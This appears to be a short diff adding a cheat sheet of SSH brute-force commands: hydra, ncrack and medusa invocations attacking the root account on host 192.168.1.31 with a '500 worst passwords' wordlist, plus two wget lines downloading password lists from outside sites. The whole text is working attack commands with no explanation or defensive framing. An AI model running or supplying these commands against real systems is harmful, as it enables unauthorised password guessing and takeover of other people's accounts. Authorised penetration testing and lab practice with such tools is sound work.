@@ -1,0 +1,6 @@
+root@kali:~/Desktop# hydra -l root -P '/root/Desktop/500-worst-passwords.txt' 192.168.1.31 ssh
+root@kali:~/Desktop# ncrack -p 22 --user root -P '/root/Desktop/500-worst-passwords.txt' 192.168.1.31
+root@kali:~/Desktop# medusa -u root -P '/root/Desktop/500-worst-passwords.txt' -h 192.168.1.31 -M ssh
+wget http://zeldor.biz/other/bruteforce/passlist.txt
+wget https://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2
+
